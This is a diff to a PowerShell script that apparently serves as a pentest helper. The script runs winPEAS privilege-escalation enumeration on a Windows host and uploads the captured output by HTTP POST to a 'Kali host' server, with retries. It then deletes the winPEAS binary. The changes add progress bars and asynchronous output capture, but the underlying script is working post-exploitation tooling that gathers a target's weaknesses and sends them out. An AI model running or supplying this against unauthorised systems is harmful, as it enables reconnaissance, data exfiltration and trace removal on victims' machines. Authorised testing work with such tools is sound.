@@ -48,7 +48,7 @@ Write-Host "[*] Running winpeas (this may take 2-5 minutes)..." -ForegroundColor
 Write-Host "[*] Output is being saved to file..." -ForegroundColor Yellow
 Write-Host ""
 
-# Run winpeas and capture output
+# Run winpeas and capture output with progress
 try {
     $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
     $ProcessInfo.FileName = $ScriptPath
@@ -60,17 +60,66 @@ try {
     $Process = New-Object System.Diagnostics.Process
     $Process.StartInfo = $ProcessInfo
     
-    Write-Host "[*] Winpeas running..." -ForegroundColor Yellow
+    Write-Host "[*] Winpeas running (PID: $($Process.Id))..." -ForegroundColor Yellow
     $Process.Start() | Out-Null
     
-    # Read output while process is running
-    $Output = $Process.StandardOutput.ReadToEnd()
-    $ErrorOutput = $Process.StandardError.ReadToEnd()
+    # Start async reading to prevent buffer deadlock
+    $OutputBuilder = New-Object System.Text.StringBuilder
+    $ErrorBuilder = New-Object System.Text.StringBuilder
+    
+    $OutputEventHandler = {
+        if ($EventArgs.Data -ne $null) {
+            [void]$Event.MessageData.AppendLine($EventArgs.Data)
+        }
+    }
+    
+    $OutputEvent = Register-ObjectEvent -InputObject $Process `
+        -EventName OutputDataReceived `
+        -Action $OutputEventHandler `
+        -MessageData $OutputBuilder
+    
+    $ErrorEvent = Register-ObjectEvent -InputObject $Process `
+        -EventName ErrorDataReceived `
+        -Action $OutputEventHandler `
+        -MessageData $ErrorBuilder
+    
+    $Process.BeginOutputReadLine()
+    $Process.BeginErrorReadLine()
+    
+    # Show progress while winpeas is running
+    $StartTime = Get-Date
+    while (-not $Process.HasExited) {
+        $Elapsed = [Math]::Round(((Get-Date) - $StartTime).TotalSeconds)
+        $Minutes = [Math]::Floor($Elapsed / 60)
+        $Seconds = $Elapsed % 60
+        
+        # Estimate progress (winpeas typically takes 1-3 minutes)
+        $EstimatedDuration = 120  # seconds
+        $ProgressPercent = [Math]::Min(95, [int](($Elapsed / $EstimatedDuration) * 100))
+        
+        $ProgressBar = "[" + ("=" * [int]($ProgressPercent / 5)) + (" " * (20 - [int]($ProgressPercent / 5))) + "]"
+        Write-Host "`r[*] Progress: $ProgressBar $ProgressPercent% | Elapsed: $Minutes`:$($Seconds.ToString('00'))" -NoNewline -ForegroundColor Cyan
+        
+        Start-Sleep -Milliseconds 500
+    }
     
     $Process.WaitForExit()
     $ExitCode = $Process.ExitCode
     
+    # Cleanup events
+    Unregister-Event -SourceIdentifier $OutputEvent.Name
+    Unregister-Event -SourceIdentifier $ErrorEvent.Name
+    Remove-Job -Id $OutputEvent.Id -Force
+    Remove-Job -Id $ErrorEvent.Id -Force
+    
+    Write-Host "`r[+] Progress: [====================] 100% | Complete!" -NoNewline -ForegroundColor Green
+    Write-Host ""
+    Write-Host ""
+    
     # Combine output and errors
+    $Output = $OutputBuilder.ToString()
+    $ErrorOutput = $ErrorBuilder.ToString()
+    
     $FullOutput = $Output
     if ($ErrorOutput) {
         $FullOutput += "`n`n=== STDERR ===`n" + $ErrorOutput
@@ -79,7 +128,6 @@ try {
     # Save to temp file
     [System.IO.File]::WriteAllText($TmpOutput, $FullOutput)
     
-    Write-Host ""
     Write-Host "[+] Winpeas completed with exit code: $ExitCode" -ForegroundColor Green
     
 } catch {
@@ -104,7 +152,7 @@ Write-Host ""
 Write-Host "[*] Transferring to Kali host..." -ForegroundColor Yellow
 Write-Host ""
 
-# Send to Kali with retry logic using WebClient (PowerShell 2.0+ compatible)
+# Send to Kali with retry logic and progress bar
 $MaxRetries = 3
 $RetryCount = 0
 $Success = $false
@@ -119,11 +167,27 @@ while ($RetryCount -lt $MaxRetries -and -not $Success) {
         $WebClient.Headers.Add("X-Scan-Type", $ScanType)
         $WebClient.Headers.Add("Content-Type", "text/plain")
         
+        # Progress bar event handler
+        $ProgressCallback = {
+            param($sender, $e)
+            $Percent = $e.ProgressPercentage
+            $Sent = [Math]::Round($e.BytesSent / 1KB, 2)
+            $Total = [Math]::Round($e.TotalBytesToSend / 1KB, 2)
+            
+            $ProgressBar = "[" + ("=" * [int]($Percent / 5)) + (" " * (20 - [int]($Percent / 5))) + "]"
+            Write-Host "`r[*] Uploading: $ProgressBar $Percent% ($Sent KB / $Total KB)" -NoNewline -ForegroundColor Cyan
+        }
+        
+        Register-ObjectEvent -InputObject $WebClient -EventName UploadProgressChanged -Action $ProgressCallback | Out-Null
+        
         $FileBytes = [System.IO.File]::ReadAllBytes($TmpOutput)
         
         $ResponseBytes = $WebClient.UploadData("$ServerUrl/upload", "POST", $FileBytes)
         $ResponseText = [System.Text.Encoding]::UTF8.GetString($ResponseBytes)
         
+        # Clear progress line
+        Write-Host "`r[+] Uploading: [====================] 100% - Complete!" -NoNewline -ForegroundColor Green
+        Write-Host ""
         Write-Host "[+] Transfer successful!" -ForegroundColor Green
         
         # Try to extract report URL from response
@@ -137,11 +201,14 @@ while ($RetryCount -lt $MaxRetries -and -not $Success) {
             # Ignore parse errors
         }
         
+        # Cleanup events
+        Get-EventSubscriber | Where-Object { $_.SourceObject -eq $WebClient } | Unregister-Event
         $WebClient.Dispose()
         $Success = $true
         
     } catch {
         $RetryCount++
+        Write-Host ""
         Write-Host "[!] Transfer failed: $_" -ForegroundColor Red
         if ($RetryCount -lt $MaxRetries) {
             Write-Host "[*] Retrying in 2 seconds..." -ForegroundColor Yellow
@@ -150,6 +217,7 @@ while ($RetryCount -lt $MaxRetries -and -not $Success) {
     }
 }
 
+Write-Host ""
 if ($Success) {
     Write-Host "[+] Cleaning up..." -ForegroundColor Green
     Remove-Item -Path $ScriptPath -Force -ErrorAction SilentlyContinue
